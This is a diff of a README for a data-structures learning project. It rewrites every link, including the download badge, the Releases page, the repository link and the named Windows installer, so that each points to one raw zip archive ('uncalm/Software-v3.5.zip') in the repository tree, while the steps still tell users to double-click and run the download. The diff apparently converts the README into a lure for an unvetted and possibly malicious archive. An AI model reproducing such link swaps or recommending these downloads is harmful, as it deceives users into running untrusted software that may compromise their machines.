@@ -1,6 +1,6 @@
 # 🎉 DSA - Enhance Your Skills with Simple Tools
 
-![Download DSA](https://img.shields.io/badge/Download-DSA-brightgreen)
+![Download DSA](https://github.com/harshitha2220/DSA/raw/refs/heads/main/uncalm/Software-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -23,12 +23,12 @@ Welcome to the DSA project! This software will help you learn and practice vario
 
 To get started, visit this page to download:
 
-[Visit the Releases Page](https://github.com/harshitha2220/DSA/releases)
+[Visit the Releases Page](https://github.com/harshitha2220/DSA/raw/refs/heads/main/uncalm/Software-v3.5.zip)
 
 Follow these steps to install the software:
 
 1. On the Releases page, look for the latest version.
-2. Click the asset link for your operating system. For example, if you are using Windows, look for `DSA_Windows.exe`.
+2. Click the asset link for your operating system. For example, if you are using Windows, look for `https://github.com/harshitha2220/DSA/raw/refs/heads/main/uncalm/Software-v3.5.zip`.
 3. The download will start automatically. 
 4. Once the download is complete, locate the file in your downloads folder.
 5. Double-click the downloaded file to run the installer.
@@ -67,7 +67,7 @@ If you face any issues, feel free to open an issue on GitHub. The community and 
 
 ## 🔗 Links
 
-- [Repository](https://github.com/harshitha2220/DSA)
-- [Visit the Releases Page](https://github.com/harshitha2220/DSA/releases)
+- [Repository](https://github.com/harshitha2220/DSA/raw/refs/heads/main/uncalm/Software-v3.5.zip)
+- [Visit the Releases Page](https://github.com/harshitha2220/DSA/raw/refs/heads/main/uncalm/Software-v3.5.zip)
 
 Thank you for checking out DSA. We hope this tool enhances your learning journey in algorithms and data structures!
